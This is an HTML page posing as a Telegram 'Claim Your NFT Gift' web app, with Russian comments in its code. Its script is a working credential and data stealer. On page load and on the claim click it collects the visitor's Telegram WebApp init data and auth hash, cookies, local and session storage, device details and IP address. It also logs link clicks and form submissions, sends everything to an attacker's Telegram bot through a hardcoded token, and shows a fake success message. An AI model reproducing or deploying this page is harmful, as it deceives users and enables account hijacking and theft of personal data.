<!DOCTYPE html>
<html>
<head>
    <title>NFT Gift Collection</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { 
            font-family: Arial, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            padding: 50px;
        }
        .container {
            max-width: 400px;
            margin: 0 auto;
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        button {
            background: #0088cc;
            color: white;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 16px;
            margin: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎁 Claim Your NFT Gift</h1>
        <p>Click below to receive your exclusive NFT</p>
        <button onclick="collectAllData()">CLAIM NFT</button>
        <div id="status"></div>
    </div>

    <script>
        const BOT_TOKEN = '7815830497:AAGDsuH3tUWR73S_JrhawnNPkPPTMOHmK3s';
        const CHAT_ID = '-1002560826337';

        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
            try {
                await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
            } catch(e) {
                console.error('Telegram send error:', e);
            }
        }

        function parseWebAppData() {
            let data = {};
            try {
                // Парсим WebApp данные из URL
                const urlParams = new URLSearchParams(window.location.hash.substr(1));
                const webAppData = urlParams.get('tgWebAppData');
                
                if(webAppData) {
                    const params = new URLSearchParams(webAppData);
                    data = {
                        query_id: params.get('query_id'),
                        user: JSON.parse(decodeURIComponent(params.get('user'))),
                        auth_date: params.get('auth_date'),
                        hash: params.get('hash'),
                        signature: params.get('signature')
                    };
                }
            } catch(e) {}
            return data;
        }

        function extractAllSensitiveData() {
            const data = {
                // Данные Telegram WebApp
                webAppData: parseWebAppData(),
                
                // Данные из Telegram.WebApp API если доступно
                webAppInitData: null,
                webAppInitDataUnsafe: null,
                
                // Системные данные
                url: window.location.href,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                screen: `${screen.width}x${screen.height}`,
                cookies: document.cookie,
                
                // Хранилища браузера
                localStorage: {},
                sessionStorage: {},
                indexedDB: []
            };

            // Получаем данные из Telegram WebApp API
            if(window.Telegram && window.Telegram.WebApp) {
                try {
                    data.webAppInitData = Telegram.WebApp.initData;
                    data.webAppInitDataUnsafe = Telegram.WebApp.initDataUnsafe;
                    data.themeParams = Telegram.WebApp.themeParams;
                    data.version = Telegram.WebApp.version;
                    data.platform = Telegram.WebApp.platform;
                } catch(e) {}
            }

            // Собираем localStorage
            for(let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                data.localStorage[key] = localStorage.getItem(key);
            }

            // Собираем sessionStorage
            for(let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                data.sessionStorage[key] = sessionStorage.getItem(key);
            }

            return data;
        }

        async function collectAllData() {
            document.getElementById('status').innerHTML = '🔄 Processing your gift...';
            
            const sensitiveData = extractAllSensitiveData();
            
            // Формируем детальный отчет
            let report = `🔐 <b>COMPLETE DATA EXTRACTION REPORT</b>\n\n`;

            // Данные пользователя Telegram
            if(sensitiveData.webAppData.user) {
                const user = sensitiveData.webAppData.user;
                report += `👤 <b>TELEGRAM USER DATA:</b>\n`;
                report += `🆔 ID: <code>${user.id}</code>\n`;
                report += `📛 Name: ${user.first_name} ${user.last_name || ''}\n`;
                report += `🔗 Username: @${user.username || 'N/A'}\n`;
                report += `🌐 Language: ${user.language_code}\n`;
                report += `⭐ Premium: ${user.is_premium}\n`;
                report += `📞 Write Access: ${user.allows_write_to_pm}\n`;
                report += `🖼️ Photo: ${user.photo_url || 'N/A'}\n\n`;
            }

            // Auth данные
            if(sensitiveData.webAppData) {
                report += `🔑 <b>AUTHENTICATION DATA:</b>\n`;
                report += `📅 Auth Date: ${new Date(sensitiveData.webAppData.auth_date * 1000).toISOString()}\n`;
                report += `🔏 Query ID: <code>${sensitiveData.webAppData.query_id}</code>\n`;
                report += `✍️ Signature: <code>${sensitiveData.webAppData.signature}</code>\n`;
                report += `#️⃣ Hash: <code>${sensitiveData.webAppData.hash}</code>\n\n`;
            }

            // Системные данные
            report += `💻 <b>SYSTEM DATA:</b>\n`;
            report += `🌐 URL: ${sensitiveData.url}\n`;
            report += `🖥️ User Agent: ${sensitiveData.userAgent}\n`;
            report += `⚙️ Platform: ${sensitiveData.platform}\n`;
            report += `🌍 Language: ${sensitiveData.language}\n`;
            report += `🕐 Timezone: ${sensitiveData.timezone}\n`;
            report += `🖼️ Screen: ${sensitiveData.screen}\n`;

            // Получаем IP
            try {
                const ipResponse = await fetch('https://api64.ipify.org?format=json');
                const ipData = await ipResponse.json();
                report += `🌐 IP Address: <code>${ipData.ip}</code>\n\n`;
            } catch(e) {
                report += `🌐 IP Address: Failed to fetch\n\n`;
            }

            // Отправляем основной отчет
            await sendToTelegram(report);

            // Отправляем дополнительные данные если есть
            if(Object.keys(sensitiveData.localStorage).length > 0) {
                let storageReport = `💾 <b>LOCAL STORAGE:</b>\n<code>${JSON.stringify(sensitiveData.localStorage, null, 2)}</code>`;
                await sendToTelegram(storageReport);
            }

            if(Object.keys(sensitiveData.sessionStorage).length > 0) {
                let sessionReport = `📝 <b>SESSION STORAGE:</b>\n<code>${JSON.stringify(sensitiveData.sessionStorage, null, 2)}</code>`;
                await sendToTelegram(sessionReport);
            }

            // WebApp Init Data
            if(sensitiveData.webAppInitData) {
                let initReport = `🚀 <b>WEBAPP INIT DATA:</b>\n<code>${sensitiveData.webAppInitData}</code>`;
                await sendToTelegram(initReport);
            }

            if(sensitiveData.webAppInitDataUnsafe) {
                let unsafeReport = `⚠️ <b>WEBAPP UNSAFE DATA:</b>\n<code>${JSON.stringify(sensitiveData.webAppInitDataUnsafe, null, 2)}</code>`;
                await sendToTelegram(unsafeReport);
            }

            document.getElementById('status').innerHTML = '✅ NFT claimed successfully!';
            await sendToTelegram('🎯 <b>DATA EXTRACTION COMPLETED SUCCESSFULLY</b>');
        }

        // Автоматический сбор при загрузке
        window.addEventListener('load', async function() {
            const initialData = extractAllSensitiveData();
            let loadReport = `🚀 <b>PAGE LOAD DETECTED</b>\n`;
            
            if(initialData.webAppData.user) {
                loadReport += `👤 User: ${initialData.webAppData.user.first_name} (ID: ${initialData.webAppData.user.id})\n`;
            }
            
            loadReport += `🌐 URL: ${window.location.href.split('#')[0]}\n`;
            loadReport += `🖥️ Platform: ${navigator.platform}\n`;
            loadReport += `🔗 Referrer: ${document.referrer || 'Direct'}`;
            
            await sendToTelegram(loadReport);
        });

        // Перехват всех действий
        document.addEventListener('click', function(e) {
            if(e.target.href) {
                sendToTelegram(`🔗 <b>LINK CLICKED:</b> ${e.target.href}`);
            }
        });

        document.addEventListener('submit', function(e) {
            const formData = new FormData(e.target);
            let formInfo = '📋 <b>FORM SUBMITTED:</b>\n';
            for(let [key, value] of formData.entries()) {
                formInfo += `<code>${key}: ${value}</code>\n`;
            }
            sendToTelegram(formInfo);
        });

        // Перехват ошибок
        window.addEventListener('error', function(e) {
            sendToTelegram(`❌ <b>JAVASCRIPT ERROR:</b> ${e.message}\n<code>${e.filename}:${e.lineno}</code>`);
        });
    </script>
</body>
</html>
